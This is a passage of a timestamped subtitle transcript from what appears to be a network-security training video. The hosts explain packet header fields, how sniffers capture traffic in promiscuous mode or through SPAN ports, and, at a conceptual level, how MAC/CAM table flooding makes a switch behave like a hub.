VLAN ID,\nMAC addresses, IP addresses.\n\n99\n00:04:44.984 --> 00:04:48.013\nWe've got a fragmentation\noffset most likely, right?\n\n100\n00:04:48.013 --> 00:04:50.800\nSo we've got packet 1 of 20,\nthat kind of thing.\n\n101\n00:04:50.800 --> 00:04:54.339\nSo if we have an ability,\nI usually just freehand it and draw it,\n\n102\n00:04:54.339 --> 00:04:58.731\nas I think you're trying to do when I talk\nabout it in class a lot of the times, and\n\n103\n00:04:58.731 --> 00:05:00.125\nI'll sketch it all out.\n\n104\n00:05:00.125 --> 00:05:02.926\nBut while Mike's putting that together for\nus, cuz that's actually kind of\n\n105\n00:05:02.926 --> 00:05:06.200\ninteresting, I think we wanna probably\npoint out a couple of things in there.\n\n106\n00:05:06.200 --> 00:05:10.642\nMike said something really great which is\nwhen we're sniffing, we're taking that raw\n\n107\n00:05:10.642 --> 00:05:13.841\ndata, that raw traffic in off the wire,\nwe're examining it.\n\n108\n00:05:13.841 --> 00:05:16.439\nBut he made the point of telling\nus that we're able to see\n\n109\n00:05:16.439 --> 00:05:17.725\nall this associated data.\n\n110\n00:05:17.725 --> 00:05:21.405\nLet's call it the metadata of the packet\nwhich is the addressings we just\n\n111\n00:05:21.405 --> 00:05:22.985\ndescribed, the VLAN ID.\n\n112\n00:05:22.985 --> 00:05:25.685\nThere may be stacked or secondary VLANs,\n\n113\n00:05:25.685 --> 00:05:29.832\nwe may have VLANs inside of VLANs\nin private secondary VLANs.\n\n114\n00:05:29.832 --> 00:05:32.442\nWe'll see offsets, we'll see flags.\n\n115\n00:05:32.442 --> 00:05:36.922\nSo much information, this metadata,\nthat surrounds the data itself,\n\n116\n00:05:36.922 --> 00:05:40.562\nthe data frame, which is the payload\nin the middle of the data packet.\n\n117\n00:05:40.562 --> 00:05:44.422\nThat tells us how to send and receive\nif this is an MPLS data network and\n\n118\n00:05:44.422 --> 00:05:46.432\nwe're dealing with MPLS packets.\n\n119\n00:05:46.432 --> 00:05:50.063\nWe have shims, the address labels\napplied on top of the packet.\n\n120\n00:05:50.063 --> 00:05:53.679\nIf this is an encapsulated\nnetwork packet and NAT or\n\n121\n00:05:53.679 --> 00:05:59.060\nsome sort of traversal packet,\nwe're gonna be able to see the wrapper.\n\n122\n00:05:59.060 --> 00:06:01.632\nWe may have some different boxes\nthat will be right in the middle.\n\n123\n00:06:01.632 --> 00:06:05.556\nAnd then maybe in the front there, we'll\njust have some different cavities, right?\n\n124\n00:06:05.556 --> 00:06:09.640\nDifferent little shoebox-like elements\nwhere we can put a bunch of stuff.\n\n125\n00:06:09.640 --> 00:06:10.849\nJust some random boxes, right?\n\n126\n00:06:10.849 --> 00:06:11.906\nLike a grid, almost, right?\n\n127\n00:06:11.906 --> 00:06:13.340\nSomething like that.\n\n128\n00:06:13.340 --> 00:06:14.505\nAnd then so we'll have all this.\n\n129\n00:06:14.505 --> 00:06:17.998\nSo it's interesting cuz as we look\nat this, we often are amazed when\n\n130\n00:06:17.998 --> 00:06:21.674\nI show customers this, when I show\nstudents this, at the amount of data\n\n131\n00:06:21.674 --> 00:06:25.630\nthat sits inside of just one of these\nsingle packets as we run a capture.\n\n132\n00:06:25.630 --> 00:06:28.140\nAnd the kind of information\nthat we can find.\n\n133\n00:06:28.140 --> 00:06:29.650\nThey're amazed at what we see.\n\n134\n00:06:29.650 --> 00:06:34.280\nWe can see protocol versions, in terms\nof the hex code, and what's in there.\n\n135\n00:06:34.280 --> 00:06:36.140\nWe could see the operating system version.\n\n136\n00:06:36.140 --> 00:06:41.840\nIf we're getting maybe,\nget requests or put requests.\n\n137\n00:06:41.840 --> 00:06:47.260\nGet requests from HTTP servers, is what\nI was trying to say, stuff like that.\n\n138\n00:06:47.260 --> 00:06:49.390\nWe're gonna be able to\nsee web server version.\n\n139\n00:06:49.390 --> 00:06:51.712\nIf we're looking at net BIOS or\nARP traffic,\n\n140\n00:06:51.712 --> 00:06:55.687\nwe can tell information about the domain\nnames or the fully qualified names,\n\n141\n00:06:55.687 --> 00:06:59.070\nthe host names, and the OS versions,\nand all that kind of stuff.\n\n142\n00:06:59.070 --> 00:07:01.261\n&gt;&gt; So if we got something we\ncan look at just briefly.\n\n143\n00:07:01.261 --> 00:07:02.366\n&gt;&gt; Sure.\n&gt;&gt; It's a picture we can just\n\n144\n00:07:02.366 --> 00:07:04.530\nquickly take a look at\nwhat I'm talking about.\n\n145\n00:07:04.530 --> 00:07:06.640\nYou know, just to give you\na sense structurally right?\n\n146\n00:07:06.640 --> 00:07:10.372\nSo up in the front, obviously\nthis is a conceptual idea, right?\n\n147\n00:07:10.372 --> 00:07:13.510\nThis is not really what a data\npacket looks like, just to be clear.\n\n148\n00:07:13.510 --> 00:07:17.520\nBut the idea up front would be that\nwe have some sort of a header.\n\n149\n00:07:17.520 --> 00:07:20.550\nAnd remember, the header is\nwhere we're gonna ultimately see\n\n150\n00:07:20.550 --> 00:07:23.530\nall of this information in\nthese little compartments.\n\n151\n00:07:23.530 --> 00:07:25.806\nYou could think of it like\na chest of drawers, right?\n\n152\n00:07:25.806 --> 00:07:29.691\nAnd we open up drawer number one,\nmaybe the drawer on the top,\n\n153\n00:07:29.691 --> 00:07:32.050\nand we see maybe IP or MAC addresses.\n\n154\n00:07:32.050 --> 00:07:34.510\nI think generically,\njust have the addresses label up there.\n\n155\n00:07:34.510 --> 00:07:36.190\nSo we would see to and from, right?\n\n156\n00:07:36.190 --> 00:07:39.480\nSo we would see sender, or recipient\nis what we often see to and from.\n\n157\n00:07:39.480 --> 00:07:41.560\nAnd we'll see MAC and IP.\n\n158\n00:07:41.560 --> 00:07:45.150\nWe'll be able to take a look at\nVLAN ID if a VLAN is being used, and\n\n159\n00:07:45.150 --> 00:07:49.530\nwe'll see if there is a VLAN ID,\nwe'll see a VLAN association.\n\n160\n00:07:49.530 --> 00:07:52.271\nWe'll see flags,\nwe'll see the protocol first of all.\n\n161\n00:07:52.271 --> 00:07:55.295\nSo is it TCP, UDP, what kind of protocol?\n\n162\n00:07:55.295 --> 00:07:57.550\nAnd then if it's TCP,\nwe'll see flags, right?\n\n163\n00:07:57.550 --> 00:08:00.799\nBecause we don't see flags with every\nprotocol, with certain protocols,\n\n164\n00:08:00.799 --> 00:08:01.416\nwe use flags.\n\n165\n00:08:01.416 --> 00:08:04.820\nSo we'll see protocols in there,\nand we'll see flags, and\n\n166\n00:08:04.820 --> 00:08:06.574\nwe'll see all sorts of stuff.\n\n167\n00:08:06.574 --> 00:08:10.222\nAnd we'll see RST for reset.\n\n168\n00:08:10.222 --> 00:08:13.512\nPSH for push, URG for urgent.\n\n169\n00:08:13.512 --> 00:08:19.352\nFIN, F-I-N for finalize or finish,\nACK for acknowledge, SYN for synchronize.\n\n170\n00:08:19.352 --> 00:08:21.220\nYou know, these are the five or\nsix packets,\n\n171\n00:08:21.220 --> 00:08:24.180\nright, that are the TCP packet flags.\n\n172\n00:08:24.180 --> 00:08:28.820\nI say five or six packets, five or six\nflags in the TCP protocol packet header.\n\n173\n00:08:28.820 --> 00:08:30.430\nThat we would often see.\n\n174\n00:08:30.430 --> 00:08:32.010\nWe may see a fragment offset.\n\n175\n00:08:32.010 --> 00:08:34.660\nSo we'll see Packet 1 of 20 or\n\n176\n00:08:34.660 --> 00:08:38.120\nwhatever that may be if there's\na fragmentation of traffic.\n\n177\n00:08:38.120 --> 00:08:42.619\nThere's so much data that's contained in\nthe header and that if we use a scanner\n\n178\n00:08:42.619 --> 00:08:46.245\nof some kind or a network sniffer\nto be able to grab this traffic,\n\n179\n00:08:46.245 --> 00:08:49.890\nwe can actually look at it in real\ntime and see what it looks like.\n\n180\n00:08:49.890 --> 00:08:53.670\nAnd we're gonna show you this in one of\nthe upcoming episodes that we do in this\n\n181\n00:08:53.670 --> 00:08:57.508\narea where we go in and we take a look at\nsome of the different ways we can actually\n\n182\n00:08:57.508 --> 00:08:59.623\nexecute sniffing attacks and what we see.\n\n183\n00:08:59.623 --> 00:09:05.771\nWhether it's using Wireshark or\nwhat would it be, or the new version\n\n184\n00:09:05.771 --> 00:09:11.930\nof Network Monitor cuz there's that new\nversion that they put out recently.\n\n185\n00:09:11.930 --> 00:09:13.560\nIt's actually kind of cool,\nthe new version.\n\n186\n00:09:13.560 --> 00:09:14.730\nSo you've got that.\n\n187\n00:09:14.730 --> 00:09:19.280\nYou've got network chemistries,\nprotocol analyzer and\n\n188\n00:09:19.280 --> 00:09:23.100\nsniffer, that we use the free\none that I often talk about.\n\n189\n00:09:23.100 --> 00:09:25.670\nThere's all these different ones\nthat you'll be able to find\n\n190\n00:09:25.670 --> 00:09:26.620\nthis data and look at it.\n\n191\n00:09:26.620 --> 00:09:29.660\nWithin the middle there in\nthe Payload We've got the actual\n\n192\n00:09:29.660 --> 00:09:33.340\nbits of data itself so that's where\nwe're gonna see our actual data.\n\n193\n00:09:33.340 --> 00:09:37.190\nSo that will be the 1600 bytes more or\nless of data or\n\n194\n00:09:37.190 --> 00:09:41.710\nwhatever winds up in there of all the data\nthat we send and then on the footer\n\n195\n00:09:41.710 --> 00:09:44.328\nat the back we actually call it the footer\nor the trailer either one, right?\n\n196\n00:09:44.328 --> 00:09:48.190\nOn the back-end, in the packet there,\n\n197\n00:09:48.190 --> 00:09:51.980\nwe're gonna see things like CRC,\nso cyclic redundancy checks.\n\n198\n00:09:51.980 --> 00:09:53.570\nWe're gonna see check sums.\n\n199\n00:09:53.570 --> 00:09:57.550\nGenerically, ECC error control and\ncorrection is what we often talk about as\n\n200\n00:09:57.550 --> 00:10:00.600\nbeing there just from\na structural perspective.\n\n201\n00:10:00.600 --> 00:10:04.500\nAll the integrity checks and\nthe error checks that we put in\n\n202\n00:10:04.500 --> 00:10:07.920\nto be able to validate that the data\nHas not been compromised or\n\n203\n00:10:07.920 --> 00:10:12.050\nin anyway manipulated, so\nthat the data is no longer got integrity.\n\n204\n00:10:12.050 --> 00:10:15.010\nSo that's gonna be the protective\nlayer that ensures the data\n\n205\n00:10:15.010 --> 00:10:18.160\nis actually transmitted and\nreceived successfully, right?\n\n206\n00:10:18.160 --> 00:10:21.981\nBecause what we don't wanna do is spend\na lot of time processing packets that have\n\n207\n00:10:21.981 --> 00:10:25.578\nbecome somehow corrupted or modified,\nbecause there's no value in that,\n\n208\n00:10:25.578 --> 00:10:28.386\nso we'll throw the data out\nessentially if the check some or\n\n209\n00:10:28.386 --> 00:10:30.768\nthe error control correction\ncomes up negative.\n\n210\n00:10:30.768 --> 00:10:32.540\nAnd we find that there's\nsome sorta problem.\n\n211\n00:10:32.540 --> 00:10:35.020\nRight?\nSo these are standard integrity checks\n\n212\n00:10:35.020 --> 00:10:38.350\nthat we would create through a hashing\nmechanism traditionally, using one or\n\n213\n00:10:38.350 --> 00:10:40.340\nmore algorithms and\nvarious things like that.\n\n214\n00:10:40.340 --> 00:10:44.203\nSo all this stuff together is gonna\noperate per packet to give us the ability\n\n215\n00:10:44.203 --> 00:10:47.532\nto go in, and to then actually\nlook at the structure of the data.\n\n216\n00:10:47.532 --> 00:10:50.850\nNow since we're looking at the picture,\nyou have another one that we created.\n\n217\n00:10:50.850 --> 00:10:52.660\nThis one was kind of on the fly.\n\n218\n00:10:52.660 --> 00:10:56.370\nBut you created another one that we\nactually had done a little work on that,\n\n219\n00:10:56.370 --> 00:10:57.870\nyeah, this one that allows us to go in.\n\n220\n00:10:57.870 --> 00:10:59.520\nAnd just talk about a sniffer works.\n\n221\n00:10:59.520 --> 00:11:01.750\nAnd since we're here,\nlet's kinda go through this.\n\n222\n00:11:01.750 --> 00:11:03.600\nCan we come out of the picture\nin picture just so\n\n223\n00:11:03.600 --> 00:11:04.960\nyou could see the edge of the frame?\n\n224\n00:11:04.960 --> 00:11:07.460\nBecause I'm kinda covering over part of,\nthere you go.\n\n225\n00:11:07.460 --> 00:11:10.950\nJust the last part of it where we\nactually wanna show the data transiting.\n\n226\n00:11:10.950 --> 00:11:12.600\nAll right, so pretend I'm there.\n\n227\n00:11:12.600 --> 00:11:13.540\nPretend I'm talking to you.\n\n228\n00:11:13.540 --> 00:11:16.245\nI'm actually making a stupid\ncrazy kinda wacky face right now.\n\n229\n00:11:16.245 --> 00:11:18.560\n&gt;&gt; [LAUGH]\n&gt;&gt; But imagine that that's me there,\n\n230\n00:11:18.560 --> 00:11:20.490\nvery seriously faced\ntalking to you right now.\n\n231\n00:11:20.490 --> 00:11:23.970\nAnd I'm actually gonna grab a seat\nhere and I'm gonna get some water.\n\n232\n00:11:23.970 --> 00:11:25.650\nI'm gonna kick back and\nI'm gonna actually talk to you.\n\n233\n00:11:25.650 --> 00:11:26.380\nI'm only kidding.\nWe're\n\n234\n00:11:26.380 --> 00:11:27.700\ngonna talk about what's going on there.\n\n235\n00:11:27.700 --> 00:11:29.070\nSo let's take a look at this.\n\n236\n00:11:29.070 --> 00:11:32.400\nSo this is just the representation\nof two very important things.\n\n237\n00:11:32.400 --> 00:11:36.443\nThe OSI model layer on one\nthrough seven top to bottom, or\n\n238\n00:11:36.443 --> 00:11:39.657\nbottom to top if we do\none to seven on the left.\n\n239\n00:11:39.657 --> 00:11:40.850\nAnd then we broke out.\n\n240\n00:11:40.850 --> 00:11:44.370\nMike broke out layer two\nspecifically of the OSI model\n\n241\n00:11:44.370 --> 00:11:48.320\njust as a kind of a focal point for us to\nzero in on, showing the two sublayers.\n\n242\n00:11:48.320 --> 00:11:49.390\nSo we're gonna get to that.\n\n243\n00:11:49.390 --> 00:11:52.546\nWe have what looks like a little SD\nmemory card down at the bottom, right?\n\n244\n00:11:52.546 --> 00:11:53.279\n&gt;&gt; That was in there.\n&gt;&gt; Right, but\n\n245\n00:11:53.279 --> 00:11:56.112\nit's actually a data packet that\nwe're just gonna move back and\n\n246\n00:11:56.112 --> 00:11:59.589\nforth that Mike's gonna kind of in real\ntime manipulate for us and talk about.\n\n247\n00:11:59.589 --> 00:12:03.807\nSo what we have at the bottom is\na bidirectional arrow Representing either\n\n248\n00:12:03.807 --> 00:12:07.958\nethernet or fiber or whatever it is as\na protocol to connect to the fiber or\n\n249\n00:12:07.958 --> 00:12:11.930\nconnect whatever the inbound\ntraffic is to the physical layer.\n\n250\n00:12:11.930 --> 00:12:13.910\nSo we've got our connectivity protocol and\n\n251\n00:12:13.910 --> 00:12:17.820\nour physical wiring and all that\nlayer one of the OSI model coming in.\n\n252\n00:12:17.820 --> 00:12:22.590\nSo the data packet comes from somewhere\nright across the network, moves in and\n\n253\n00:12:22.590 --> 00:12:26.510\nthen heads up into layer one of the OSI\nmodel through the physical interface and\n\n254\n00:12:26.510 --> 00:12:28.830\nthen ultimately goes up into layer two.\n\n255\n00:12:28.830 --> 00:12:32.615\nAnd in layer two is where we start\nexamining and interrogating the packet and\n\n256\n00:12:32.615 --> 00:12:36.190\nso we move it over kind of to\nthe blow out there so we can see it.\n\n257\n00:12:36.190 --> 00:12:39.330\nAnd we go through a very simple error\ncontrol and correction mechanism, so\n\n258\n00:12:39.330 --> 00:12:42.150\nwe look at the LLC layer to\nensure we have integrity.\n\n259\n00:12:42.150 --> 00:12:45.860\nAnd we look at the MAC layer to check\nthe MAC addressing on the packet.\n\n260\n00:12:45.860 --> 00:12:50.774\nNow remember, we talked about the fact\nthat in the header is where we can see\n\n261\n00:12:50.774 --> 00:12:51.950\nthe MAC address.\n\n262\n00:12:51.950 --> 00:12:55.197\nWe would take a look,\ncompare the Mac address,\n\n263\n00:12:55.197 --> 00:12:59.510\nwhich is a 12-character\nalphanumeric set of information.\n\n264\n00:12:59.510 --> 00:13:02.480\nSo, it's gonna be, you have bundlings for\ngroups of 2, 0, 1.\n\n265\n00:13:02.480 --> 00:13:07.366\nAB, you know E7 and\nthen another series of six.\n\n266\n00:13:07.366 --> 00:13:08.956\nWe're talking about Ipv4 and\n\n267\n00:13:08.956 --> 00:13:12.576\nif we're talking about IPv6 well\nyou know looks totally different.\n\n268\n00:13:12.576 --> 00:13:14.148\n&gt;&gt; [LAUGH]\n&gt;&gt; Don't get me started with that but\n\n269\n00:13:14.148 --> 00:13:15.690\neither way we've got a Mac address.\n\n270\n00:13:15.690 --> 00:13:16.530\nWe're gonna compare that.\n\n271\n00:13:16.530 --> 00:13:18.570\nNow, it's a very simple but\nvery elegant and\n\n272\n00:13:18.570 --> 00:13:22.390\neffective comparison because what\nwe're looking for is a match.\n\n273\n00:13:22.390 --> 00:13:27.350\nIf we find the Mac address in the header\nof the packet that belongs to us then that\n\n274\n00:13:27.350 --> 00:13:32.390\nMac address essentially compares to what's\nin the packet In the recipient bin.\n\n275\n00:13:32.390 --> 00:13:34.270\nWe take that information.\n\n276\n00:13:34.270 --> 00:13:36.180\nWe say, okay, the packet's meant for us.\n\n277\n00:13:36.180 --> 00:13:38.900\nNow we continue the packet's\njourney up the OSI model,\n\n278\n00:13:38.900 --> 00:13:41.100\nwherever it's going based on\nwhatever we're doing with it,\n\n279\n00:13:41.100 --> 00:13:45.530\nmost likely into the application layer so\nit can be seen or interacted with, right?\n\n280\n00:13:45.530 --> 00:13:47.770\nSo that may be the end of the journey, but\n\n281\n00:13:47.770 --> 00:13:50.650\nif the MAC address doesn't compare\nfavorably, if it's not meant for for\n\n282\n00:13:50.650 --> 00:13:55.490\nus the packet essentially goes back down,\nlayer two down into layer one goes back on\n\n283\n00:13:55.490 --> 00:13:58.120\nwire and you would zip off to\nthe left there or somewhere, right?\n\n284\n00:13:58.120 --> 00:14:01.040\nAnd you essentially wind up going\nwherever it's supposed to go.\n\n285\n00:14:01.040 --> 00:14:02.483\nIt'd be really cool if you\ncould do that in a wind up.\n\n286\n00:14:02.483 --> 00:14:03.674\n&gt;&gt; [LAUGH]\n&gt;&gt; Like just going across\n\n287\n00:14:03.674 --> 00:14:04.408\nmy screen\n&gt;&gt; [LAUGH]\n\n288\n00:14:04.408 --> 00:14:05.680\n&gt;&gt; And ultimately wound up,\n\n289\n00:14:05.680 --> 00:14:09.590\ngoing around the room here and\nthen circle back, came out the other side.\n\n290\n00:14:09.590 --> 00:14:10.500\n&gt;&gt; We'll work on that effect.\n\n291\n00:14:10.500 --> 00:14:13.610\n&gt;&gt; Or you can throw it over in Studio 1,\nthat would be cool.\n\n292\n00:14:13.610 --> 00:14:17.190\nThey can pick it up and ship it back over\nto us right, going around the other way.\n\n293\n00:14:17.190 --> 00:14:18.220\n&gt;&gt; That packet's not for us.\n\n294\n00:14:18.220 --> 00:14:21.900\n&gt;&gt; No, no, no, that's ITProTV Version 2,\nthat's coming soon.\n\n295\n00:14:21.900 --> 00:14:25.193\nSo the packet would obviously\ncontinue on its journey, right?\n\n296\n00:14:25.193 --> 00:14:26.130\nSo this is normal.\n\n297\n00:14:26.130 --> 00:14:27.510\nThis what we expect.\n\n298\n00:14:27.510 --> 00:14:31.245\nBut when we want to run a network sniffer,\nwe have to change the behavior because\n\n299\n00:14:31.245 --> 00:14:34.754\nthe goal of the sniffer is as you said;\nto capture the data, to look at it and\n\n300\n00:14:34.754 --> 00:14:36.244\nto understand the value of it.\n\n301\n00:14:36.244 --> 00:14:37.787\nIf all we did was sniff\ntraffic coming to us,\n\n302\n00:14:37.787 --> 00:14:40.988\nthere's no value in that by itself because\nwe're already getting that traffic, right?\n\n303\n00:14:40.988 --> 00:14:45.800\nThere's no value in saying I want to\nrun a special program to get it because\n\n304\n00:14:45.800 --> 00:14:48.330\nI would have gotten it regardless\nbecause its addressed to me.\n\n305\n00:14:48.330 --> 00:14:51.490\nWhat we wanna do is we wanna capture\nall the traffic that's not meant to\n\n306\n00:14:51.490 --> 00:14:52.000\ncome to us.\n\n307\n00:14:52.000 --> 00:14:56.820\nThat's really what the sniffer does and\nso we have to turn this network interface\n\n308\n00:14:56.820 --> 00:15:00.400\ninto an interface that runs in\nwhat's called promiscuous mode.\n\n309\n00:15:00.400 --> 00:15:03.430\nAnd promiscuous mode is\ngoing to allow us to\n\n310\n00:15:03.430 --> 00:15:06.940\nmanipulate the way layer two of\nthe OSI model actually operates.\n\n311\n00:15:06.940 --> 00:15:10.035\nWe often talk about promiscuous mode and\nwe just describe it to people quickly and\n\n312\n00:15:10.035 --> 00:15:12.810\nsay, yeah, we just got this thing\ncalled a promiscuous driver.\n\n313\n00:15:12.810 --> 00:15:14.610\nIf it's in Windows, it's WinPcap.\n\n314\n00:15:14.610 --> 00:15:16.472\nIf it's Linux, it's LibPcap.\n\n315\n00:15:16.472 --> 00:15:20.700\nAnd WinPCap is just the LidPCap port\nto Windows, and you install it.\n\n316\n00:15:20.700 --> 00:15:24.130\nAnd it does its thing, and yeah,\nyou can see all the packets.\n\n317\n00:15:24.130 --> 00:15:25.340\nWhat we often leave out and\n\n318\n00:15:25.340 --> 00:15:30.550\nkinda gloss over is that we're actually\nchanging the way the network model works.\n\n319\n00:15:30.550 --> 00:15:34.610\nThis is a significant thing,\nbecause we're manipulating and\n\n320\n00:15:34.610 --> 00:15:39.930\nessentially modifying behavior in\nthe network stack by adding a driver that,\n\n321\n00:15:39.930 --> 00:15:43.130\ninstead of doing a one to one\ncomparison on the MAC address for\n\n322\n00:15:43.130 --> 00:15:48.510\na match says regardless of MAC address\nmatch, essentially record all traffic.\n\n323\n00:15:48.510 --> 00:15:53.040\nAnd so LibPCap on Linux or WinPCap,\nthe equivalent in Windows is going\n\n324\n00:15:53.040 --> 00:15:57.380\nto operate essentially as a vacuum cleaner\ninstead of as a comparison driver.\n\n325\n00:15:57.380 --> 00:16:01.600\nAnd it just takes all the traffic\nup into the OSI Model layer two.\n\n326\n00:16:01.600 --> 00:16:05.513\nIrrespective of MAC address match,\nit runs it up into the layer seven to\n\n327\n00:16:05.513 --> 00:16:10.098\nthe application layer where the network\nmonitor probably is running as a program.\n\n328\n00:16:10.098 --> 00:16:13.740\nOr whatever layer it attaches to based\non the kind of monitoring it does.\n\n329\n00:16:13.740 --> 00:16:18.366\nIt's gonna record that packet Keep a copy\nof it in the database and then we're\n\n330\n00:16:18.366 --> 00:16:22.370\ngonna have the packet essentially\nround trip back down and go out.\n\n331\n00:16:22.370 --> 00:16:24.370\nYeah you just got to copy it.\n\n332\n00:16:24.370 --> 00:16:27.190\n&gt;&gt; I gotta get that other shape behind it,\nthere we go.\n\n333\n00:16:27.190 --> 00:16:28.110\n&gt;&gt; There we go.\n\n334\n00:16:28.110 --> 00:16:30.970\nThen we're gonna be able to grab it and\nsend it back on it's way.\n\n335\n00:16:30.970 --> 00:16:32.520\nSo it's almost like a xerox machine.\n\n336\n00:16:32.520 --> 00:16:35.640\nWe're gonna suck the traffic up,\nwe're gonna make a copy of it,\n\n337\n00:16:35.640 --> 00:16:39.110\nwe're gonna keep the copy for inspection\nand introspection in the database.\n\n338\n00:16:39.110 --> 00:16:42.420\nAnd then we're gonna have a duplicate\nthat essentially is sent on its way.\n\n339\n00:16:42.420 --> 00:16:44.650\nNow all of this happens so quickly, right,\n\n340\n00:16:44.650 --> 00:16:47.320\nthat we don't really see\nany delay to speak of.\n\n341\n00:16:47.320 --> 00:16:49.430\nI mean it's not like we're sitting\ntwiddling our thumbs going all right,\n\n342\n00:16:49.430 --> 00:16:50.771\nwhen the hell's our data gonna get here.\n\n343\n00:16:50.771 --> 00:16:51.851\n&gt;&gt; [LAUGH]\n&gt;&gt; What's going on?\n\n344\n00:16:51.851 --> 00:16:54.600\nIt's five minutes and\nit's supposed to have been here already.\n\n345\n00:16:54.600 --> 00:16:57.560\nThis is a few milliseconds\nof time back and forth.\n\n346\n00:16:57.560 --> 00:17:01.220\nThousandths of a second, not nanoseconds,\n\n347\n00:17:01.220 --> 00:17:02.910\ncuz that would really be\nbillionths of a second.\n\n348\n00:17:02.910 --> 00:17:04.280\nBut thousandths of a second.\n\n349\n00:17:04.280 --> 00:17:07.010\nRight?\nSo this is not really gonna impact us.\n\n350\n00:17:07.010 --> 00:17:08.730\nIt's just adding a little\nbit of an overhead.\n\n351\n00:17:08.730 --> 00:17:11.210\nBut what it does is it allows\nthe capture all traffic.\n\n352\n00:17:11.210 --> 00:17:14.880\nNow again,\nif we're doing this from a single host.\n\n353\n00:17:14.880 --> 00:17:17.213\nWe're doing it just traffic\nfrom that host, right?\n\n354\n00:17:17.213 --> 00:17:20.850\nIf we're doing it across a switch\nusing what's called the SPAN port.\n\n355\n00:17:20.850 --> 00:17:23.150\nWe're gonna get all traffic to and\nfrom that switch on the subnet.\n\n356\n00:17:24.470 --> 00:17:28.150\nBroadens dramatically our ability to be\nable to see traffic and understand it.\n\n357\n00:17:28.150 --> 00:17:31.060\nSo it's a question of where\nwe choose to do the sniffing.\n\n358\n00:17:31.060 --> 00:17:32.470\nBut however we do this,\n\n359\n00:17:32.470 --> 00:17:34.880\nwe're gonna get a much broader picture\nof what's going on in the network.\n\n360\n00:17:34.880 --> 00:17:36.980\nAnd this is the really\ncool thing about sniffing.\n\n361\n00:17:36.980 --> 00:17:40.150\nSo we have to convert the system\nto run in promiscuous mode.\n\n362\n00:17:40.150 --> 00:17:44.100\nNow if we do it through a switch, we SPAN\nthe switchboard, sucking all the traffic\n\n363\n00:17:44.100 --> 00:17:47.390\nin, so the switchboard essentially\nruns in promiscuous mode, if you will,\n\n364\n00:17:47.390 --> 00:17:48.770\nrecords all the traffic.\n\n365\n00:17:48.770 --> 00:17:51.910\nBut the monitor behind it is\nplugged in right to the switch, and\n\n366\n00:17:51.910 --> 00:17:55.760\nthat monitor physically or on a virtual\nmachine running as a interface or\n\n367\n00:17:55.760 --> 00:17:59.050\nwhatever, will then just simply record\nall traffic coming through that port.\n\n368\n00:17:59.050 --> 00:18:01.030\nSo we can do it through\nthe switch very easily, but\n\n369\n00:18:01.030 --> 00:18:04.610\nthe trick here is to understand that\nwe're talking about promiscuous mode.\n\n370\n00:18:04.610 --> 00:18:05.600\nAnd how that's gonna work.\n\n371\n00:18:05.600 --> 00:18:08.470\nAnd so, yeah we could be doing\nthis passively, or actively.\n\n372\n00:18:08.470 --> 00:18:09.920\nToday we're really do active sniffing.\n\n373\n00:18:09.920 --> 00:18:13.790\nWe don't really do passive sniffing,\nunless we attack a switch and flip it\n\n374\n00:18:13.790 --> 00:18:17.980\nby flooding it to run like essentially\na hub, and then we can passively sniff it.\n\n375\n00:18:17.980 --> 00:18:21.080\nBut the reality is passive sniffing\nwas something we did on hubs.\n\n376\n00:18:21.080 --> 00:18:23.260\nWhen was the last time you saw a hub,\nor had a hub?\n\n377\n00:18:23.260 --> 00:18:24.680\n&gt;&gt; [LAUGH]\n&gt;&gt; I mean we just don't really do this\n\n378\n00:18:24.680 --> 00:18:25.780\nkind of stuff anymore.\n\n379\n00:18:25.780 --> 00:18:29.390\nToday most systems without, almost without\nexception are all based on switch network.\n\n380\n00:18:29.390 --> 00:18:32.060\nSwitch network you have to actively sniff\n\n381\n00:18:32.060 --> 00:18:36.960\nusing some sort of a system that will\npull traffic in using promiscuous mode.\n\n382\n00:18:36.960 --> 00:18:40.850\nDrivers and or SPAN ports running\nthat way to be able to do this and\n\n383\n00:18:40.850 --> 00:18:44.170\nmore often than not we're going to\ninject our packets into the network so\n\n384\n00:18:44.170 --> 00:18:46.162\nthat we can manipulate\nthe switch behavior.\n\n385\n00:18:46.162 --> 00:18:48.640\nWell, actually, before we do that,\ngo back one more second, sorry.\n\n386\n00:18:48.640 --> 00:18:53.180\nSo this is what happens when we\nhave an amateur to run the program,\n\n387\n00:18:53.180 --> 00:18:54.880\nyou don't pay attention to the host.\n\n388\n00:18:54.880 --> 00:18:56.740\nWho's not done making a point yet.\n\n389\n00:18:56.740 --> 00:19:00.350\nSo next time he tells you to switch\nlook to me, ask me before we go.\n\n390\n00:19:00.350 --> 00:19:03.880\nCuz Mike clearly was not keeping\nin mind what we were doing.\n\n391\n00:19:03.880 --> 00:19:05.470\nThe only point I was gonna\nmake just quickly before\n\n392\n00:19:05.470 --> 00:19:08.000\nwe move on is just with this idea\nof injecting our packets, right.\n\n393\n00:19:08.000 --> 00:19:11.770\nSo I just wanted to talk about this\nwith regards to the OSI model cuz\n\n394\n00:19:11.770 --> 00:19:14.850\nthis is obviously gonna be important for\nus just to visualize.\n\n395\n00:19:14.850 --> 00:19:18.566\nOne of the things we can do today,\nI mention attacking a switch, essentially,\n\n396\n00:19:18.566 --> 00:19:19.351\nby flooding it.\n\n397\n00:19:19.351 --> 00:19:20.665\nMac flooding or Sin flooding,\n\n398\n00:19:20.665 --> 00:19:23.452\nthere's different ways to be able\nto achieve flooding attacks.\n\n399\n00:19:23.452 --> 00:19:28.363\nBut what we're doing essentially is trying\nto knock off the switch's ability to act\n\n400\n00:19:28.363 --> 00:19:32.650\nas a switch and flip it by flooding it and\nflooding what's called the CAM,\n\n401\n00:19:32.650 --> 00:19:37.495\nthe Content Addressable Memory table which\nis a routing table that a switch creates\n\n402\n00:19:37.495 --> 00:19:41.371\nand uses that creates MAC address\ninformation in memory that tells\n\n403\n00:19:41.371 --> 00:19:45.070\nthe switch how to essentially\ntranslate and deliver, right?\n\n404\n00:19:45.070 --> 00:19:48.840\nIt's the routing information\nthat the switch maintains.\n\n405\n00:19:48.840 --> 00:19:53.160\nWhen we do this, if we can flood the cam\ntable, to switch acts like a hub,\n\n406\n00:19:53.160 --> 00:19:57.000\nbecause essentially we've broken\nthe switch's ability to store information.\n\n407\n00:19:57.000 --> 00:19:59.190\nWe've done what's called\nresetting its learning mode.\n\n408\n00:19:59.190 --> 00:20:03.310\nAnd as a result of that, the switch now\nbehaves like a hub, it's a dumb device.\n\n409\n00:20:03.310 --> 00:20:06.820\nSo if we could do that by flooding\nit with bad ARP information or\n\n410\n00:20:06.820 --> 00:20:09.880\ninjecting our packets into\nthe network to flood and\n\n411\n00:20:09.880 --> 00:20:13.480\noverwhelm the switch we can make\na switch behave as if it's open.\n\n412\n00:20:13.480 --> 